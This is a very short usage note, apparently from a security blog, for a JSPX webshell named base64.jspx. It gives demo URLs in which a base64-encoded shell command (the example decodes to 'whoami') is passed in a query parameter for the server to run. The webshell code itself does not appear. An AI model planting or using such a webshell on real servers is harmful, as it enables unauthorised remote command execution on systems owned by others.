Author:Ends  
site:<url>http://ends.cc/?p=165</url>

    demo:http://ends.cc/webshell/base64.jspx?str=base64(cmd)
         http://ends.cc/webshell/base64.jspx?str=d2hvYW1p (d2hvYW1p == base64(whoami))